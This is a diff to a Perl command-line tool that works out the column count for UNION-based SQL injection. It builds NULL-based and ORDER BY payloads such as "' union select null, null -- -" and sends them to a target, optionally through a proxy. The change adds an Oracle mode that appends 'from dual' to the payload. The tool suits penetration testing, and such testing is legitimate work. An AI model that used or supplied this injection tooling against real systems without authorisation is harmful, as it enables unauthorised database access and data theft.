@@ -17,7 +17,8 @@ our (
     $proxy,
     $null,
     $help,
-    $binSearch
+    $binSearch,
+    $oracle
 );
 
 print "Determining number of columns for UNION based SQL injection\n";
@@ -30,7 +31,8 @@ GetOptions(
     'proxy=s'       => \$proxy,
     'null'          => \$null,
     'h|help'        => \$help,
-    'bin-search'    => \$binSearch
+    'bin-search'    => \$binSearch,
+    'oracle'        => \$oracle
 );
 
 &help() if $help;
@@ -112,7 +114,7 @@ if ($null) {
             my $payload = &orderByVariantPayload($i);
             my $result = &sendRequest($payload);
             if (!$result && $result != -1) {
-                say "Column number:" . --$i;
+                say "Column number: " . --$i;
                 exit;
             }
         }
@@ -143,7 +145,10 @@ sub sendRequest {
 
 sub nullVariantPayload {
     my $num = shift;
-    return "' union select " . ($num > 1 ? "null, " x ($num-1) : "") . "null -- -";
+    my $payload = "' union select " . ($num > 1 ? "null, " x ($num-1) : "") . "null";
+    $payload .= " from dual" if $oracle;
+    $payload .= " -- -";
+    return $payload;
 }
 
 sub orderByVariantPayload {
@@ -158,5 +163,6 @@ sub help {
     print "\t--proxy=<proxy URL>\tie. Burp Suite\n";
     print "\t--null\t\t\tif you want to use NULL based method (default - using ORDER BY)\n";
     print "\t--bin-search\t\tif you want to use binary search (using ORDER BY only)\n";
+    print "\t--oracle\t\tif you work with Oracle DB and want to use NULL based variant\n";
     exit;
 }
